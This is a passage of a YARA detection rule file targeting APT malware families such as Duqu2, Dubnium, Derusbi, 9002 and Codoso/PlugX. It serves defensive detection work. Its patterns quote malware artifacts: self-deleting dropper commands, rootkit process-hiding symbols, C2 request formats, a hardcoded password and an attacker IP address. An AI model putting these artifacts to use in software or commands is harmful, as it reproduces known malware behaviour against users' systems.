hash3 = "288ebfe21a71f83b5575dfcc92242579fb13910d"
strings:
$x1 = "svcmsi_32.dll" fullword wide
$x2 = "msi3_32.dll" fullword wide
$x3 = "msi4_32.dll" fullword wide
$x4 = "MSI.dll" fullword ascii
$s1 = "SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'" fullword wide
$s2 = "Sysinternals installer" fullword wide /* PEStudio Blacklist: strings */
$s3 = "Process Explorer" fullword wide /* PEStudio Blacklist: strings */ /* Goodware String - occured 5 times */
condition:
uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of ($x*) ) and ( all of ($s*) )
}
rule SSC_Duqu2_Generic1
{
meta:
description = "Kaspersky APT Report - Duqu2 Sample - Generic Rule"
author = "Florian Roth"
reference = "https://goo.gl/7yKyOj"
date = "2015-06-10"
super_rule = 1
hash0 = "3f9168facb13429105a749d35569d1e91465d313"
hash1 = "0a574234615fb2382d85cd6d1a250d6c437afecc"
hash2 = "38447ed1d5e3454fe17699f86c0039f30cc64cde"
hash3 = "5282d073ee1b3f6ce32222ccc2f6066e2ca9c172"
hash4 = "edfca3f0196788f7fde22bd92a8817a957c10c52"
hash5 = "6a4ffa6ca4d6fde8a30b6c8739785f4bd2b5c415"
hash6 = "00170bf9983e70e8dd4f7afe3a92ce1d12664467"
hash7 = "32f8689fd18c723339414618817edec6239b18f3"
hash8 = "f860acec9920bc009a1ad5991f3d5871c2613672"
hash9 = "413ba509e41c526373f991d1244bc7c7637d3e13"
hash10 = "29cd99a9b6d11a09615b3f9ef63f1f3cffe7ead8"
hash11 = "dfe1cb775719b529138e054e7246717304db00b1"
strings:
$s0 = "Global\\{B54E3268-DE1E-4c1e-A667-2596751403AD}" fullword wide
$s1 = "SetSecurityDescriptorSacl" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 189 times */
$s2 = "msisvc_32@" fullword wide
$s3 = "CompareStringA" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 1392 times */
$s4 = "GetCommandLineW" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 1680 times */
condition:
uint16(0) == 0x5a4d and filesize < 150KB and all of them
}
rule SSC_APT_Kaspersky_Duqu2_SamsungPrint
{
meta:
description = "Kaspersky APT Report - Duqu2 Sample - file 2a9a5afc342cde12c6eb9a91ad29f7afdfd8f0fb17b983dcfddceccfbc17af69"
author = "Florian Roth"
reference = "https://goo.gl/7yKyOj"
date = "2015-06-10"
hash = "ce39f41eb4506805efca7993d3b0b506ab6776ca"
strings:
$s0 = "Installer for printer drivers and applications" fullword wide /* PEStudio Blacklist: strings */
$s1 = "msi4_32.dll" fullword wide
$s2 = "HASHVAL" fullword wide
$s3 = "SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'" fullword wide
$s4 = "ca.dll" fullword ascii
$s5 = "Samsung Electronics Co., Ltd." fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 82KB and all of them
}
rule SSC_Dubnium_Sample_6
{
meta:
description = "Detects sample mentioned in the Dubnium Report"
author = "Florian Roth"
reference = "https://goo.gl/AW9Cuu"
date = "2016-06-10"
super_rule = 1
hash1 = "5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b"
hash2 = "5f07b074414513b73e202d7f77ec4bcf048f13dd735c9be3afcf25be818dc8e0"
hash3 = "839baf85de657b6d6503b6f94054efa8841f667987a9c805eab94a85a859e1ba"
strings:
$s1 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&()`~-_=+[{]{;',." fullword ascii
$s2 = "e_$0[bW\\RZY\\jb\\ZY[nimiRc[jRZ]" fullword ascii
$s3 = "f_RIdJ0W9RFb[$Fbc9[k_?Wn" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 4000KB and all of them
}
rule SSC_Dubnium_Sample_7
{
meta:
description = "Detects sample mentioned in the Dubnium Report"
author = "Florian Roth"
reference = "https://goo.gl/AW9Cuu"
date = "2016-06-10"
super_rule = 1
hash1 = "16f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b"
hash2 = "1feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8"
hash3 = "41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf"
hash4 = "5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b"
hash5 = "5f07b074414513b73e202d7f77ec4bcf048f13dd735c9be3afcf25be818dc8e0"
hash6 = "a25715108d2859595959879ff50085bc85969e9473ecc3d26dda24c4a17822c9"
hash7 = "bd780f4d56214c78045454d31d83ae18ed209cc138e75d138e72976a7ef9803f"
hash8 = "e0918072d427d12b43f436bf0797a361996ae436047d4ef8277f11caf2dd481b"
strings:
$s1 = "hWI[$lZ![nJ_[[lk[8Ihlo8ZiIl[[[$Ynk[f_8[88WWWJW[YWnl$$Z[ilf!$IZ$!W>Wl![W!k!$l!WoW8$nj8![8n_I^$[>_n[ZY[[Xhn_c!nnfK[!Z" fullword ascii
$s2 = "[i_^])[$n!]Wj^,h[,!WZmk^o$dZ[h[e!&W!l[$nd[d&)^Z\\^[[iWh][[[jPYO[g$$e&n\\,Wfg$[<g$[[ninn:j!!)Wk[nj[[o!!Y" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 9000KB and all of them
}
rule SSC_Dubnium_Sample_5
{
meta:
description = "Detects sample mentioned in the Dubnium Report"
author = "Florian Roth"
reference = "https://goo.gl/AW9Cuu"
date = "2016-06-10"
super_rule = 1
hash1 = "16f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b"
hash2 = "1feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8"
hash3 = "41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf"
hash4 = "5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b"
hash5 = "5f07b074414513b73e202d7f77ec4bcf048f13dd735c9be3afcf25be818dc8e0"
hash6 = "839baf85de657b6d6503b6f94054efa8841f667987a9c805eab94a85a859e1ba"
hash7 = "a25715108d2859595959879ff50085bc85969e9473ecc3d26dda24c4a17822c9"
hash8 = "bd780f4d56214c78045454d31d83ae18ed209cc138e75d138e72976a7ef9803f"
hash9 = "e0918072d427d12b43f436bf0797a361996ae436047d4ef8277f11caf2dd481b"
strings:
$s1 = "$innn[i$[i$^i[e[mdi[m$jf1Wehn[^Whl[^iin_hf$11mahZijnjbi[^[W[f1n$dej$[hn]1[W1ni1l[ic1j[mZjchl$$^he[[j[a[1_iWc[e[" fullword ascii
$s2 = "h$YWdh[$ij7^e$n[[_[h[i[[[\\][1$1[[j1W1[1cjm1[$[k1ZW_$$ncn[[Inbnnc[I9enanid[fZCX" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 9000KB and all of them
}
rule SSC_Dubnium_Sample_SSHOpenSSL
{
meta:
description = "Detects sample mentioned in the Dubnium Report"
author = "Florian Roth"
reference = "https://goo.gl/AW9Cuu"
date = "2016-06-10"
hash1 = "6f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b"
hash2 = "feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8"
hash3 = "41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf"
hash4 = "bd780f4d56214c78045454d31d83ae18ed209cc138e75d138e72976a7ef9803f"
hash5 = "a25715108d2859595959879ff50085bc85969e9473ecc3d26dda24c4a17822c9"
hash6 = "e0918072d427d12b43f436bf0797a361996ae436047d4ef8277f11caf2dd481b"
strings:
$s1 = "sshkeypairgen.exe" fullword wide
$s2 = "OpenSSL: FATAL" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 9000KB and all of them
}
rule SSC_Dubnium_Sample_1
{
meta:
description = "Detects sample mentioned in the Dubnium Report"
author = "Florian Roth"
reference = "https://goo.gl/AW9Cuu"
date = "2016-06-10"
hash1 = "839baf85de657b6d6503b6f94054efa8841f667987a9c805eab94a85a859e1ba"
strings:
$key1 = "3b840e20e9555e9fb031c4ba1f1747ce25cc1d0ff664be676b9b4a90641ff194" fullword ascii
$key2 = "90631f686a8c3dbc0703ffa353bc1fdf35774568ac62406f98a13ed8f47595fd" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}
rule SSC_Dubnium_Sample_2
{
meta:
description = "Detects sample mentioned in the Dubnium Report"
author = "Florian Roth"
reference = "https://goo.gl/AW9Cuu"
date = "2016-06-10"
hash1 = "5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b"
strings:
$x1 = ":*:::D:\\:c:~:" fullword ascii
$s2 = "SPMUVR" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}
rule SSC_Dubnium_Sample_3
{
meta:
description = "Detects sample mentioned in the Dubnium Report"
author = "Florian Roth"
reference = "https://goo.gl/AW9Cuu"
date = "2016-06-10"
hash1 = "caefcdf2b4e5a928cdf9360b70960337f751ec4a5ab8c0b75851fc9a1ab507a8"
hash2 = "e0362d319a8d0e13eda782a0d8da960dd96043e6cc3500faeae521d1747576e5"
hash3 = "a77d1c452291a6f2f6ed89a4bac88dd03d38acde709b0061efd9f50e6d9f3827"
strings:
$x1 = "copy /y \"%s\" \"%s\" " fullword ascii
$x2 = "del /f \"%s\" " fullword ascii
$s1 = "del /f /ah \"%s\" " fullword ascii
$s2 = "if exist \"%s\" goto Rept " fullword ascii
$s3 = "\\*.*.lnk" fullword ascii
$s4 = "Dropped" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2000KB and 5 of them
}
rule SSC_APT_Derusbi_DeepPanda
{
meta:
author = "ThreatConnect Intelligence Research Team"
reference = "http://www.crowdstrike.com/sites/default/files/AdversaryIntelligenceReport_DeepPanda_0.pdf"
strings:
$D = "Dom4!nUserP4ss" wide ascii
condition:
$D
}
rule SSC_Derusbi_Kernel_Driver_WD_UDFS
{
meta:
description = "Detects Derusbi Kernel Driver"
author = "Florian Roth"
reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
date = "2015-12-15"
score = 80
hash1 = "1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016"
hash2 = "50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a"
hash3 = "6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58"
hash4 = "e27fb16dce7fff714f4b05f2cef53e1919a34d7ec0e595f2eaa155861a213e59"
strings:
$x1 = "\\\\.\\pipe\\usbpcex%d" fullword wide
$x2 = "\\\\.\\pipe\\usbpcg%d" fullword wide
$x3 = "\\??\\pipe\\usbpcex%d" fullword wide
$x4 = "\\??\\pipe\\usbpcg%d" fullword wide
$x5 = "$$$--Hello" fullword ascii
$x6 = "Wrod--$$$" fullword ascii
$s1 = "\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword wide
$s2 = "Update.dll" fullword ascii
$s3 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI" fullword wide
$s4 = "\\Driver\\nsiproxy" fullword wide
$s5 = "HOST: %s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 800KB and (2 of ($x*) or all of ($s*))
}
rule SSC_apt_nix_elf_Derusbi_Linux_Strings
{
meta:
Author = "@seifreed"
strings:
$a1 = "loadso" wide ascii fullword
$a2 = "\nuname -a\n\n" wide ascii
$a3 = "/dev/shm/.x11.id" wide ascii
$a4 = "LxMain64" wide ascii nocase
$a5 = "# \\u@\\h:\\w \\$ " wide ascii
$b1 = "0123456789abcdefghijklmnopqrstuvwxyz" wide
$b2 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ" wide
$b3 = "ret %d" wide fullword
$b4 = "uname -a\n\n" wide ascii
$b5 = "/proc/%u/cmdline" wide ascii
$b6 = "/proc/self/exe" wide ascii
$b7 = "cp -a %s %s" wide ascii
$c1 = "/dev/pts/4" wide ascii fullword
$c2 = "/tmp/1408.log" wide ascii fullword
condition:
uint32(0) == 0x464C457F and ((1 of ($a*) and 4 of ($b*)) or (1 of ($a*) and 1 of ($c*)) or 2 of ($a*) or all of ($b*))
}
rule SSC_derusbi_kernel
{
meta:
description = "Derusbi Driver version"
date = "2015-12-09"
author = "Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud"
strings:
$token1 = "$$$--Hello"
$token2 = "Wrod--$$$"
$cfg = "XXXXXXXXXXXXXXX"
$class = ".?AVPCC_BASEMOD@@"
$MZ = "MZ"
condition:
$MZ at 0 and $token1 and $token2 and $cfg and $class
}
rule SSC_APT_Derusbi_Gen
{
meta:
author = "ThreatConnect Intelligence Research Team"
strings:
$2 = "273ce6-b29f-90d618c0" wide ascii
$A = "Ace123dx" fullword wide ascii
$A1 = "Ace123dxl!" fullword wide ascii
$A2 = "Ace123dx!@#x" fullword wide ascii
$C = "/Catelog/login1.asp" wide ascii
$DF = "~DFTMP$$$$$.1" wide ascii
$G = "GET /Query.asp?loginid=" wide ascii
$L = "LoadConfigFromReg failded" wide ascii
$L1 = "LoadConfigFromBuildin success" wide ascii
$ph = "/photoe/photo.asp HTTP" wide ascii
$PO = "POST /photos/photo.asp" wide ascii
$PC = "PCC_IDENT" wide ascii
condition:
any of them
}
rule SSC_apt_nix_elf_derusbi_kernelModule
{
meta:
Author = "@seifreed"
strings:
$ = "__this_module"
$ = "init_module"
$ = "unhide_pid"
$ = "is_hidden_pid"
$ = "clear_hidden_pid"
$ = "hide_pid"
$ = "license"
$ = "description"
$ = "srcversion="
$ = "depends="
$ = "vermagic="
$ = "current_task"
$ = "sock_release"
$ = "module_layout"
$ = "init_uts_ns"
$ = "init_net"
$ = "init_task"
$ = "filp_open"
$ = "__netlink_kernel_create"
$ = "kfree_skb"
condition:
(uint32(0) == 0x4464c457f) and (all of them)
}
rule SSC_apt_win32_dll_bergard_pgv_pvid_variant
{
meta:
copyright = "Fidelis Cybersecurity"
reference = "http://www.threatgeek.com/2016/05/turbo-twist-two-64-bit-derusbi-strains-converge.html"
strings:
$ = "Accept:"
$ = "User-Agent: %s"
$ = "Host: %s:%d"
$ = "Cache-Control: no-cache"
$ = "Connection: Keep-Alive"
$ = "Cookie: pgv_pvid="
$ = "Content-Type: application/x-octet-stream"
$ = "User-Agent: %s"
$ = "Host: %s:%d"
$ = "Pragma: no-cache"
$ = "Connection: Keep-Alive"
$ = "HTTP/1.0"
condition:
(uint16(0) == 0x5A4D) and (all of them)
}
rule SSC_apt_win_exe_trojan_derusbi
{
meta:
Author = "@seifreed"
strings:
$sa_1 = "USB" wide ascii
$sa_2 = "RAM" wide ascii
$sa_3 = "SHARE" wide ascii
$sa_4 = "HOST: %s:%d"
$sa_5 = "POST"
$sa_6 = "User-Agent: Mozilla"
$sa_7 = "Proxy-Connection: Keep-Alive"
$sa_8 = "Connection: Keep-Alive"
$sa_9 = "Server: Apache"
$sa_10 = "HTTP/1.1"
$sa_11 = "ImagePath"
$sa_12 = "ZwUnloadDriver"
$sa_13 = "ZwLoadDriver"
$sa_14 = "ServiceMain"
$sa_15 = "regsvr32.exe"
$sa_16 = "/s /u" wide ascii
$sa_17 = "rand"
$sa_18 = "_time64"
$sa_19 = "DllRegisterServer"
$sa_20 = "DllUnregisterServer"
$sa_21 = { 8b [5] 8b ?? d3 ?? 83 ?? 08 30 [5] 40 3b [5] 72 } // Decode Driver
$sb_1 = "PCC_CMD_PACKET"
$sb_2 = "PCC_CMD"
$sb_3 = "PCC_BASEMOD"
$sb_4 = "PCC_PROXY"
$sb_5 = "PCC_SYS"
$sb_6 = "PCC_PROCESS"
$sb_7 = "PCC_FILE"
$sb_8 = "PCC_SOCK"
$sc_1 = "bcdedit -set testsigning" wide ascii
$sc_2 = "update.microsoft.com" wide ascii
$sc_3 = "_crt_debugger_hook" wide ascii
$sc_4 = "ue8G5" wide ascii
$sd_1 = "NET" wide ascii
$sd_2 = "\\\\.\\pipe\\%s" wide ascii
$sd_3 = ".dat" wide ascii
$sd_4 = "CONNECT %s:%d" wide ascii
$sd_5 = "\\Device\\" wide ascii
$se_1 = "-%s-%04d" wide ascii
$se_2 = "-%04d" wide ascii
$se_3 = "FAL" wide ascii
$se_4 = "OK" wide ascii
$se_5 = "2.03" wide ascii
$se_6 = "XXXXXXXXXXXXXXX" wide ascii
condition:
(uint16(0) == 0x5A4D) and ( (all of ($sa_*)) or ((13 of ($sa_*)) and ( (5 of ($sb_*)) or (3 of ($sc_*)) or (all of ($sd_*)) or ( (1 of ($sc_*)) and (all of ($se_*)) ) ) ) )
}
rule SSC_XOR_4byte_Key
{
meta:
description = "Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)"
author = "Florian Roth"
reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
date = "2015-12-15"
score = 60
strings:
/* Op Code */
$s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 }
/*
test    ecx, ecx
jz      short loc_590170
xor     [esi], eax
add     [esi], ebx
add     esi, 4
dec     ecx
jmp     short loc_590162
*/
condition:
uint16(0) == 0x5a4d and filesize < 900KB and all of them
}
rule SSC_apt_nix_elf_Derusbi_Linux_SharedMemCreation
{
meta:
Author = "@seifreed"
strings:
$byte1 = { B6 03 00 00 ?? 40 00 00 00 ?? 0D 5F 01 82 }
condition:
(uint32(0) == 0x464C457F) and (any of them)
}
rule SSC_Trojan_Derusbi
{
meta:
Author = "RSA_IR"
Date     = "4Sept13"
File     = "derusbi_variants v 1.3"
MD5      = " c0d4c5b669cc5b51862db37e972d31ec "
strings:
$b1 = {8b 15 ?? ?? ?? ?? 8b ce d3 ea 83 c6 ?? 30 90 ?? ?? ?? ?? 40 3b 05 ?? ?? ?? ?? 72 ??}
$b2 = {F3 5D 88 2E ?? ?? 00 00 BE 07 18 2E F0 5D 88 2E F7 5D 88 2E 0C A2 88 2E 4B 5D 88 2E F3 5D 88 2E}
$b3 = {4E E6 40 BB}
$b4 = {B1 19 BF 44}
$b5 = {6A F5 44 3D ?? ?? 00 00 27 AF D4 3D 69 F5 44 3D 6E F5 44 3D 95 0A 44 3D D2 F5 44 3D 6A F5 44 3D}
$b6 = {F3 5D 88 2E ?? ?? 00 00 BE 07 18 2E F0 5D 88 2E}
$b7 = {D6 D5 A4 A3 ?? ?? 00 00 9B 8F 34 A3 D5 D5 A4 A3 D2 D5 A4 A3 29 2A A4 A3}
$b8 = {C3 76 33 9F ?? ?? 00 00 8E 2C A3 9F C0 76 33 9F C7 76 33 9F 3C 89 33 9F}
condition:
2 of ($b1, $b2, $b3, $b4) and 1 of ($b5, $b6, $b7, $b8)
}
rule SSC_apt_nix_elf_derusbi
{
meta:
Author = "@seifreed"
strings:
$ = "LxMain"
$ = "execve"
$ = "kill"
$ = "cp -a %s %s"
$ = "%s &"
$ = "dbus-daemon"
$ = "--noprofile"
$ = "--norc"
$ = "TERM=vt100"
$ = "/proc/%u/cmdline"
$ = "loadso"
$ = "/proc/self/exe"
$ = "Proxy-Connection: Keep-Alive"
$ = "Connection: Keep-Alive"
$ = "CONNECT %s"
$ = "HOST: %s:%d"
$ = "User-Agent: Mozilla/4.0"
$ = "Proxy-Authorization: Basic %s"
$ = "Server: Apache"
$ = "Proxy-Authenticate"
$ = "gettimeofday"
$ = "pthread_create"
$ = "pthread_join"
$ = "pthread_mutex_init"
$ = "pthread_mutex_destroy"
$ = "pthread_mutex_lock"
$ = "getsockopt"
$ = "socket"
$ = "setsockopt"
$ = "select"
$ = "bind"
$ = "shutdown"
$ = "listen"
$ = "opendir"
$ = "readdir"
$ = "closedir"
$ = "rename"
condition:
(uint32(0) == 0x4464c457f) and (all of them)
}
rule SSC_derusbi_linux
{
meta:
description = "Derusbi Server Linux version"
date = "2015-12-09"
author = "Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud"
strings:
$PS1 = "PS1=RK# \\u@\\h:\\w \\$"
$cmd = "unset LS_OPTIONS;uname -a"
$pname = "[diskio]"
$rkfile = "/tmp/.secure"
$ELF = "\x7fELF"
condition:
$ELF at 0 and $PS1 and $cmd and $pname and $rkfile
}
rule SSC_Derusbi_Code_Signing_Cert
{
meta:
description = "Detects an executable signed with a certificate also used for Derusbi Trojan - suspicious"
author = "Florian Roth"
reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
date = "2015-12-15"
score = 40
strings:
$s1 = "Fuqing Dawu Technology Co.,Ltd.0" fullword ascii
$s2 = "XL Games Co.,Ltd.0" fullword ascii
$s3 = "Wemade Entertainment co.,Ltd0" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 800KB and 1 of them
}
rule SSC_APT_DeputyDog_Strings
{
meta:
author = "FireEye Labs"
version = "1.0"
description = "detects string seen in samples used in 2013-3893 0day attacks"
reference = "8aba4b5184072f2a50cbc5ecfe326701"
strings:
$mz = {4d 5a}
$a = "DGGYDSYRL"
condition:
($mz at 0) and $a
}
rule SSC_FE_APT_9002
{
meta:
Author      = "FireEye Labs"
Date        = "2013/11/10"
Description = "Strings inside"
Reference   = "Useful link"
strings:
$mz = { 4d 5a }
$a = "rat_UnInstall" wide ascii
condition:
($mz at 0) and $a
}
rule SSC_APT9002Code
{
meta:
description = "9002 code features"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
// start code block
$ = { B9 7A 21 00 00 BE ?? ?? ?? ?? 8B F8 ?? ?? ?? F3 A5 }
// decryption from other variant with multiple start threads
$ = { 8A 14 3E 8A 1C 01 32 DA 88 1C 01 8B 54 3E 04 40 3B C2 72 EC }
condition:
any of them
}
rule SSC_APT9002Strings
{
meta:
description = "9002 Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
$ = "POST http://%ls:%d/%x HTTP/1.1"
$ = "%%TEMP%%\\%s_p.ax" wide ascii
$ = "%TEMP%\\uid.ax" wide ascii
$ = "%%TEMP%%\\%s.ax" wide ascii
// also triggers on surtr $ = "mydll.dll\x00DoWork"
$ = "sysinfo\x00sysbin01"
$ = "\\FlashUpdate.exe"
condition:
any of them
}
rule SSC_APT_DeputyDog_Fexel
{
meta:
author = "ThreatConnect Intelligence Research Team"
strings:
$180 = "180.150.228.102" wide ascii
$0808cmd = {25 30 38 78 30 38 78 00 5C 00 63 00 6D 00 64 00 2E 00 65 00 78 00 65 [2-6] 43 00 61 00 6E 00 27 00 74 00 20 00 6F 00 70 00 65 00 6E 00 20 00 73 00 68 00 65 00 6C 00 6C 00 21}
$cUp = "Upload failed! [Remote error code:" nocase wide ascii
$DGGYDSYRL = {00 44 47 47 59 44 53 59 52 4C 00}
$GDGSYDLYR = "GDGSYDLYR_%" wide ascii
condition:
any of them
}
rule SSC_Codoso_CustomTCP
{
meta:
description = "Codoso CustomTCP Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "b95d7f56a686a05398198d317c805924c36f3abacbb1b9e3f590ec0d59f845d8"
strings:
$s4 = "wnyglw" fullword ascii
$s5 = "WorkerRun" fullword ascii
$s7 = "boazdcd" fullword ascii
$s8 = "wayflw" fullword ascii
$s9 = "CODETABL" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 405KB and all of them
}
rule SSC_Codoso_PlugX_3
{
meta:
description = "Detects Codoso APT PlugX Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "74e1e83ac69e45a3bee78ac2fac00f9e897f281ea75ed179737e9b6fe39971e3"
strings:
$s1 = "Cannot create folder %sDCRC failed in the encrypted file %s. Corrupt file or wrong password." fullword wide
$s2 = "mcs.exe" fullword ascii
$s3 = "McAltLib.dll" fullword ascii
$s4 = "WinRAR self-extracting archive" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1200KB and all of them
}
rule SSC_Codoso_PGV_PVID_6
{
meta:
description = "Detects Codoso APT PGV_PVID Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "4b16f6e8414d4192d0286b273b254fa1bd633f5d3d07ceebd03dfdfc32d0f17f"
strings:
$s0 = "rundll32 \"%s\",%s" fullword ascii
$s1 = "/c ping 127.%d & del \"%s\"" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 6000KB and all of them
}
rule SSC_Codoso_PGV_PVID_5
{
meta:
description = "Detects Codoso APT PGV PVID Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
super_rule = 1
hash1 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
hash2 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
strings:
$s1 = "/c del %s >> NUL" fullword ascii
$s2 = "%s%s.manifest" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 500KB and all of them
}
rule SSC_Codoso_PGV_PVID_4
{
meta:
description = "Detects Codoso APT PlugX Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
super_rule = 1
hash1 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
hash2 = "8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761"
hash3 = "b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1"
hash4 = "b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3"
hash5 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
strings:
$x1 = "dropper, Version 1.0" fullword wide
$x2 = "dropper" fullword wide
$x3 = "DROPPER" fullword wide
$x4 = "About dropper" fullword wide
$s1 = "Microsoft Windows Manager Utility" fullword wide
$s2 = "SYSTEM\\CurrentControlSet\\Services\\" fullword ascii /* Goodware String - occured 9 times */
$s3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify" fullword ascii /* Goodware String - occured 10 times */
$s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* Goodware String - occured 46 times */
$s5 = "<supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"></supportedOS>" fullword ascii /* Goodware String - occured 65 times */
condition:
uint16(0) == 0x5a4d and filesize < 900KB and 1 of ($x*) and 2 of ($s*)
}
rule SSC_Codoso_PlugX_1
{
meta:
description = "Detects Codoso APT PlugX Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
super_rule = 1
hash1 = "0b8cbc9b4761ab35acce2aa12ba2c0a283afd596b565705514fd802c8b1e144b"
hash2 = "448711bd3f689ceebb736d25253233ac244d48cb766834b8f974c2e9d4b462e8"
hash3 = "fd22547497ce52049083092429eeff0599d0b11fe61186e91c91e1f76b518fe2"
strings:
$s1 = "GETPASSWORD1" fullword ascii
$s2 = "NvSmartMax.dll" fullword ascii
$s3 = "LICENSEDLG" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 800KB and all of them
}
rule SSC_Codoso_PGV_PVID_1
{
meta:
description = "Detects Codoso APT PGV PVID Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
super_rule = 1
hash1 = "41a936b0d1fd90dffb2f6d0bcaf4ad0536f93ca7591f7b75b0cd1af8804d0824"
hash2 = "58334eb7fed37e3104d8235d918aa5b7856f33ea52a74cf90a5ef5542a404ac3"
hash3 = "934b87ddceabb2063b5e5bc4f964628fe0c63b63bb2346b105ece19915384fc7"
hash4 = "ce91ea20aa2e6af79508dd0a40ab0981f463b4d2714de55e66d228c579578266"
hash5 = "e770a298ae819bba1c70d0c9a2e02e4680d3cdba22d558d21caaa74e3970adf1"
strings:
$x1 = "Cookie: pgv_pvid=" ascii
$x2 = "DRIVERS\\ipinip.sys" fullword wide
$s1 = "TsWorkSpaces.dll" fullword ascii
$s2 = "%SystemRoot%\\System32\\wiaservc.dll" fullword wide
$s3 = "/selfservice/microsites/search.php?%016I64d" fullword ascii
$s4 = "/solutions/company-size/smb/index.htm?%016I64d" fullword ascii
$s5 = "Microsoft Chart ActiveX Control" fullword wide
$s6 = "MSChartCtrl.ocx" fullword wide
$s7 = "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}" fullword ascii
$s8 = "WUServiceMain" fullword ascii /* Goodware String - occured 2 times */
condition:
( uint16(0) == 0x5a4d and ( 1 of ($x*) or 3 of them ) ) or 5 of them
}
rule SSC_Codoso_CustomTCP_2
{
meta:
description = "Detects Codoso APT CustomTCP Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "3577845d71ae995762d4a8f43b21ada49d809f95c127b770aff00ae0b64264a3"
strings:
$s1 = "varus_service_x86.dll" fullword ascii
$s2 = "/s %s /p %d /st %d /rt %d" fullword ascii
$s3 = "net start %%1" fullword ascii
$s4 = "ping 127.1 > nul" fullword ascii
